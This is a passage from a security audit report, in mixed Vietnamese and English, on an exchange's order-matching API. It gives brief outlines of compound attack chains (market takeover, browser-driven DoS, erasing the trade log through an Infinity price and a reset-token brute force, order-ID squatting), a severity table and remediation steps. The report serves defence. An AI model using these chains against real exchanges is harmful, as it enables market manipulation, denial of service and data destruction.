- **Information disclosure**: enumerate order IDs.
- **DoS side-effect**: cancel confirmed IDs → wipe victim orders.

**Severity: LOW** — latent; HIGH nếu SEC-01 được fix nhưng này không.

### Fix đề xuất
- Cancel require auth; chỉ cho phép cancel order của chính mình.
- Return 200 cho cả trường hợp không tồn tại (để tránh oracle), với flag `cancelled: false`.

---

---

## Attack Chains (Compound Exploits)

### Chain A: Full Market Takeover
```
SEC-04 (disclose IDs) → SEC-01 (cancel competitors) → SEC-03 (jump queue)
→ Attacker có total control over fills tại mọi price level.
```

### Chain B: Browser-as-Bot Exchange DoS
```
SEC-11 (WS eavesdrop từ browser) → SEC-05 (CORS + no auth)
→ Phishing site → 10,000 victim browsers flood exchange → SEC-07 OOM.
```

### Chain C: Evidence Erasure
```
SEC-06 (Infinity price) → self-trade lớn với NaN metadata → SEC-09 (pushout)
→ Flood self-trades > MAX_TRADES → evict real trade → SEC-10 (token brute)
→ /api/reset → full book wipe.
```

### Chain D: ID Squatting Griefing
```
SEC-04 (learn victim's ID pattern) → SEC-02 (squat ID) → SEC-14 (oracle verify)
→ Confirm squat success → victim's trades silently ignored.
```

---

## Severity Distribution

| Severity | Count | IDs |
|----------|-------|-----|
| CRITICAL | 1 | SEC-01 |
| HIGH     | 8 | SEC-02, SEC-03, SEC-04, SEC-05, SEC-06, SEC-07, SEC-08, SEC-09 |
| MEDIUM   | 4 | SEC-10, SEC-11, SEC-12, SEC-13 |
| LOW      | 1 | SEC-14 |

---

## Remediation Priority

1. **SEC-01** — Add authentication layer (API key / JWT) với user ownership trên order.
2. **SEC-03** — Override timestamp ở server, ignore client-supplied value.
3. **SEC-06** — `math.isfinite(price)` validation.
4. **SEC-05** — CORS whitelist cụ thể; require auth header.
5. **SEC-07, SEC-08** — Rate limiting + broadcast fan-out timeout + parallel send.
6. **SEC-04** — Redesign API: aggregated book levels, không expose order_id cross-user.
7. **SEC-02, SEC-09** — Server-side ID generation + persistent trade log.
8. **SEC-10, SEC-11, SEC-12, SEC-13, SEC-14** — Constant-time compare, Origin check, input validation, status code normalization.

---

## Notes trên Threat Model Assumptions

- Report giả định **no existing auth** — mọi vuln AuthZ/IDOR đều từ thiếu foundation này.
- Nếu roadmap đã có auth plan, ưu tiên: SEC-01, SEC-05, SEC-10 phải được fix trong cùng milestone.
- Các vuln DoS (SEC-07, SEC-08) có thể mitigate partial bằng infrastructure (WAF, rate-limit proxy) nhưng fix tại application layer vẫn cần.
- SEC-06 và SEC-12 là classic "known-unknown" input validation — audit toàn bộ user-input surface cho class bugs tương tự.
